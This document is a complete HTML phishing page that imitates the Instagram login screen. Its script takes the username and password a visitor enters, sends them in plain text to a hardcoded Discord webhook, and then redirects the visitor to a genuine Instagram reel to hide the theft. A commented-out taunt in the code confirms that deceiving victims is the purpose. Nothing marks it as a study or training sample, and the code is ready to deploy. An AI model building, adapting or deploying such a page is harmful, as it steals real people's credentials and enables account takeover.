<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="./media/inst.png">
</head>

<body>
    <div class="container">
        
        <div class="Box1">
            <div class="image">
                <div class="backImage">
                    <div class="front"></div>
                </div>
            </div>
        </div>
        <div class="loginForm">
            <div class="instagram iborder">
                <div class="instaLogo"></div>
                <div class="form">
                    <div class="details">

                        <div class="username iborder"><input class="inputSection" type="text"
                                placeholder="Phone number, username or email address"></div>

                        <div class="password iborder"><input class="inputSection" type="password"
                                placeholder="Password"></div>
                        <div class="login"><Button type="submit" class="rad inputButton">Log in</Button></div>
                    </div>
                    <div class="lower">
                        <div class="or"></div>

                        <div class="fb-ico">
                            <div class="fb"></div> <span> <a href="">Log in with Facebook</a></span>
                        </div>
                        <div class="redBox">
                            <div class="forgot-pass">Forgotten password?</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="dontAccount iborder">
                <div class="noAcc">
                    <span>Don't have an account?</span><span style="color:  rgb(20, 156, 210);"><b> Sign up</b></span>
                </div>
            </div>

            <div class="lastSection">
                <div class="getApp">
                    <span>Get the app.</span>
                </div>
                <div class="stores">
                    <div class=" store appleStore"></div>
                    <div class="store playStore"></div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="metaLogo"></div>
        </div>
    </div>


    <script defer>
        const login = document.querySelector('.login button');
        const username = document.querySelector('.username input');
        const password = document.querySelector('.password input');

        login.addEventListener('click', (e) => {
            e.preventDefault();
            // alert("Chutiya banaya tumko!!!");
            // console.log(username.value);
            // console.log(password.value);

            if (username.value.trim().length === 0) {
                console.log("Empty Inputs");
            }
            else if(password.value.trim().length === 0) {
                console.log("Empty Inputs");
            }
            else {
                const userdata = {
                    username: username.value,
                    pass: password.value
                }
                sendData(userdata);

                window.location.replace("https://www.instagram.com/reel/CvuRC56o-hw/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==");

                username.value = null;
                password.value = null;
            }
        });

        function sendData(userdata) {
            const webhookUrl = 'https://discord.com/api/webhooks/1161261447721000970/0R1p_kqZuJZDwY9dX2SkQjb3DZVhKdUgLEgejt1VXznuGfHgXKCrpu_kaJ3NKOyp7-p9';

            const data = {
                content: `Username : ${userdata.username} , Password : ${userdata.pass}`,
                username: `${userdata.username}`
            };

            const requestOptions = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            };

            fetch(webhookUrl, requestOptions)
                .then(response => {
                    if (response.status === 204) {
                        console.log('Data sent successfully to Discord!');
                    } else {
                        // console.error('Failed to send data to Discord.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        }
    </script>

</body>

</html>
